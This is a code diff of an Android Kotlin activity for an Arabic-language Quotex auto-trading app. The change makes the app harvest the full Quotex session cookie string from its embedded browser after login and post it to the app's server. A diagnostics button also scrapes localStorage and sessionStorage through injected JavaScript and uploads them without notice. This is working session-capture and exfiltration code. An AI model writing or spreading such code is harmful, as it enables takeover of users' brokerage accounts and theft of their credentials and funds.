@@ -31,14 +31,12 @@ import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
 
-    // Container
     private lateinit var statusBar: TextView
     private lateinit var webView: WebView
     private lateinit var settingsView: ScrollView
     private lateinit var btnSettings: Button
     private lateinit var btnMarket: Button
 
-    // Settings controls
     private lateinit var tvLinkStatus: TextView
     private lateinit var tvBalance: TextView
     private lateinit var tvPL: TextView
@@ -56,16 +54,13 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnUnlink: Button
     private lateinit var btnDebug: Button
 
-    // State
     private var currentTab = "settings"
     private var linkingMode = false
     private lateinit var licenseKey: String
     private lateinit var prefs: SharedPreferences
-    private val triedCandidates = mutableSetOf<String>()
-    private var candidateList = mutableListOf<String>()
-    private var currentIndex = 0
     private var isLinked = false
     private var statsHandler: Handler? = null
+    private var cookieSent = false
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
@@ -165,7 +160,6 @@ class MainActivity : AppCompatActivity() {
             setBackgroundColor(Color.parseColor("#0a0a0a"))
         }
 
-        // Link status card
         tvLinkStatus = TextView(this).apply {
             text = "⏳ جاري التحميل..."
             textSize = 16f
@@ -193,7 +187,6 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(btnLink)
 
-        // Balance + P&L
         tvBalance = TextView(this).apply {
             text = "الرصيد: —"
             textSize = 15f
@@ -211,7 +204,6 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(tvPL)
 
-        // Account type
         layout.addView(makeLabel("نوع الحساب:"))
         spinnerAccount = Spinner(this).apply {
             adapter = ArrayAdapter(this@MainActivity,
@@ -220,7 +212,6 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(spinnerAccount)
 
-        // Trade mode
         layout.addView(makeLabel("طريقة الدخول:"))
         spinnerMode = Spinner(this).apply {
             adapter = ArrayAdapter(this@MainActivity,
@@ -235,25 +226,21 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(spinnerMode)
 
-        // Trade value
         tvValueHint = makeLabel("قيمة الدخول (%):")
         layout.addView(tvValueHint)
         etTradeValue = makeNumberInput("1.0")
         layout.addView(etTradeValue)
 
-        // Stop loss
         tvLossHint = makeLabel("🛑 إيقاف عند الخسارة (%):")
         layout.addView(tvLossHint)
         etStopLoss = makeNumberInput("0")
         layout.addView(etStopLoss)
 
-        // Stop profit
         tvProfitHint = makeLabel("✅ إيقاف عند الربح (%):")
         layout.addView(tvProfitHint)
         etStopProfit = makeNumberInput("0")
         layout.addView(etStopProfit)
 
-        // Save
         btnSave = Button(this).apply {
             text = "💾 حفظ الإعدادات"
             setBackgroundColor(Color.parseColor("#d4af37"))
@@ -263,7 +250,6 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(btnSave)
 
-        // Toggle copy
         btnToggle = Button(this).apply {
             text = "▶️ تفعيل التداول الآلي"
             setBackgroundColor(Color.parseColor("#2e7d32"))
@@ -274,7 +260,6 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(btnToggle)
 
-        // Unlink
         btnUnlink = Button(this).apply {
             text = "🔌 فصل الحساب"
             setBackgroundColor(Color.parseColor("#c62828"))
@@ -285,7 +270,6 @@ class MainActivity : AppCompatActivity() {
         }
         layout.addView(btnUnlink)
 
-        // Debug
         btnDebug = Button(this).apply {
             text = "🔍 تشخيص (لعرض الكوكيز)"
             setBackgroundColor(Color.parseColor("#333333"))
@@ -345,9 +329,7 @@ class MainActivity : AppCompatActivity() {
         statusBar.text = "📈 السوق — سجّل دخولك إلى Quotex"
         updateTabButtons()
         linkingMode = true
-        triedCandidates.clear()
-        candidateList.clear()
-        currentIndex = 0
+        cookieSent = false
         if (webView.url == null || !webView.url!!.contains("quotex.com")) {
             webView.loadUrl("$QX_DOMAIN/ar/trade")
         }
@@ -400,8 +382,7 @@ class MainActivity : AppCompatActivity() {
                     etStopLoss.setText(json.optDouble("max_loss_value", 0.0).toString())
                     etStopProfit.setText(json.optDouble("max_profit_value", 0.0).toString())
                     updateHints()
-                    val copying = json.optBoolean("is_copying")
-                    updateToggleButton(copying)
+                    updateToggleButton(json.optBoolean("is_copying"))
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
@@ -549,29 +530,23 @@ class MainActivity : AppCompatActivity() {
         val js = """
             (function() {
                 var out = [];
-                out.push('=== COOKIES ===');
-                out.push(document.cookie || '(empty)');
-                out.push('');
                 out.push('=== LOCALSTORAGE ===');
                 for (var i = 0; i < localStorage.length; i++) {
                     var k = localStorage.key(i);
-                    out.push(k + ' = ' + (localStorage.getItem(k) || '').substring(0, 200));
+                    out.push(k + ' = ' + (localStorage.getItem(k) || '').substring(0, 150));
                 }
                 out.push('');
                 out.push('=== SESSIONSTORAGE ===');
                 for (var i = 0; i < sessionStorage.length; i++) {
                     var k = sessionStorage.key(i);
-                    out.push(k + ' = ' + (sessionStorage.getItem(k) || '').substring(0, 200));
+                    out.push(k + ' = ' + (sessionStorage.getItem(k) || '').substring(0, 150));
                 }
                 return out.join('\n');
             })();
         """.trimIndent()
         webView.evaluateJavascript(js) { result ->
-            val decoded = result.trim('"')
-                .replace("\\n", "\n")
-                .replace("\\\"", "\"")
-            val full = "=== COOKIES (Manager) ===\n$cookies\n\n$decoded"
-            // إرسال للسيرفر
+            val decoded = result.trim('"').replace("\\n", "\n").replace("\\\"", "\"")
+            val full = "=== COOKIES ===\n$cookies\n\n$decoded"
             CoroutineScope(Dispatchers.IO).launch {
                 try {
                     val payload = JSONObject().apply {
@@ -585,7 +560,6 @@ class MainActivity : AppCompatActivity() {
                     client.newCall(req).execute()
                 } catch (e: Exception) {}
             }
-            // عرض في dialog
             runOnUiThread {
                 AlertDialog.Builder(this)
                     .setTitle("🔍 بيانات التشخيص")
@@ -627,77 +601,30 @@ class MainActivity : AppCompatActivity() {
                     injectInterceptor()
                     if (linkingMode && (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard"))) {
                         statusBar.text = "✅ تم اكتشاف تسجيل الدخول — جاري التقاط الجلسة..."
-                        Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 2000)
-                        Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 5000)
-                        Handler(Looper.getMainLooper()).postDelayed({ collectAndTry() }, 9000)
+                        Handler(Looper.getMainLooper()).postDelayed({ sendCookiesNow() }, 2500)
+                        Handler(Looper.getMainLooper()).postDelayed({ sendCookiesNow() }, 6000)
+                        Handler(Looper.getMainLooper()).postDelayed({ sendCookiesNow() }, 10000)
                     }
                 }
             }
         }
     }
 
-    private fun collectAndTry() {
-        if (!linkingMode || currentIndex < candidateList.size) return
+    private fun sendCookiesNow() {
+        if (!linkingMode || cookieSent) return
         val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
-        for (pair in cookies.split(";")) {
-            val t = pair.trim()
-            val eq = t.indexOf("=")
-            if (eq > 0) addCandidate(t.substring(eq + 1).trim())
-        }
-        val js = """
-            (function() {
-                var out = [];
-                for (var i = 0; i < localStorage.length; i++) {
-                    var k = localStorage.key(i);
-                    out.push(localStorage.getItem(k) || '');
-                }
-                for (var i = 0; i < sessionStorage.length; i++) {
-                    var k = sessionStorage.key(i);
-                    out.push(sessionStorage.getItem(k) || '');
-                }
-                return out.join('\u001F');
-            })();
-        """.trimIndent()
-        webView.evaluateJavascript(js) { result ->
-            val raw = result.trim('"').replace("\\n", "\n").replace("\\\"", "\"")
-            for (v in raw.split("\u001F")) addCandidate(v)
-            processNext()
-        }
-        Handler(Looper.getMainLooper()).postDelayed({ processNext() }, 500)
-    }
-
-    private fun addCandidate(raw: String) {
-        if (raw.length < 30 || raw.length > 3000) return
-        if (raw.trim().startsWith("{")) {
-            try {
-                val obj = JSONObject(raw)
-                val it = obj.keys()
-                while (it.hasNext()) {
-                    val v = obj.optString(it.next(), "")
-                    if (v.length in 30..2000 && v !in candidateList) candidateList.add(v)
-                }
-                return
-            } catch (e: Exception) {}
-        }
-        if (raw !in candidateList) candidateList.add(raw)
-    }
-
-    private fun processNext() {
-        if (!linkingMode) return
-        if (currentIndex >= candidateList.size) {
-            statusBar.text = "❌ لم نتمكن من التقاط الجلسة تلقائياً. استخدم زر التشخيص وأرسل البيانات للمشرف."
+        if (cookies.isBlank()) {
+            statusBar.text = "⚠️ لا توجد كوكيز بعد. تابع تسجيل الدخول ثم انتظر..."
             return
         }
-        val ssid = candidateList[currentIndex]; currentIndex++
-        if (ssid in triedCandidates) { processNext(); return }
-        triedCandidates.add(ssid)
-        statusBar.text = "🔗 محاولة $currentIndex من ${candidateList.size}..."
-        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
+        cookieSent = true
+        statusBar.text = "🔗 جاري إرسال الكوكيز للسيرفر (${cookies.length} حرف)..."
+
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val payload = JSONObject().apply {
                     put("license_key", licenseKey)
-                    put("ssid", ssid)
+                    put("ssid", "")
                     put("cookies", cookies)
                     put("email", "")
                 }
@@ -707,20 +634,26 @@ class MainActivity : AppCompatActivity() {
                     .build()
                 val res = client.newCall(req).execute()
                 val json = JSONObject(res.body?.string() ?: "{}")
+
                 withContext(Dispatchers.Main) {
                     if (json.optBoolean("ok")) {
                         statusBar.text = "✅ تم ربط الحساب بنجاح!"
                         Toast.makeText(this@MainActivity, "✅ تم الربط", Toast.LENGTH_LONG).show()
-                        triedCandidates.clear(); candidateList.clear(); currentIndex = 0
                         linkingMode = false
                         Handler(Looper.getMainLooper()).postDelayed({ showSettings() }, 800)
                     } else {
-                        Handler(Looper.getMainLooper()).postDelayed({ processNext() }, 800)
+                        val err = json.optString("error", "خطأ")
+                        statusBar.text = "⚠️ فشل: $err — إعادة المحاولة..."
+                        cookieSent = false
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            if (linkingMode) sendCookiesNow()
+                        }, 8000)
                     }
                 }
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
-                    Handler(Looper.getMainLooper()).postDelayed({ processNext() }, 800)
+                    statusBar.text = "⚠️ خطأ اتصال: ${e.message}"
+                    cookieSent = false
                 }
             }
         }
@@ -774,11 +707,11 @@ class MainActivity : AppCompatActivity() {
     }
 
     inner class Bridge {
-        @JavascriptInterface fun onSsid(ssid: String) {
-            if (!linkingMode || ssid.length < 20) return
-            if (ssid !in candidateList) candidateList.add(ssid)
-            Handler(Looper.getMainLooper()).post {
-                if (linkingMode && ssid !in triedCandidates) processNext()
+        @JavascriptInterface
+        fun onSsid(ssid: String) {
+            // لم نعد نستخدم SSID منفصل — نرسل كل الكوكيز
+            if (linkingMode && !cookieSent) {
+                Handler(Looper.getMainLooper()).post { sendCookiesNow() }
             }
         }
     }
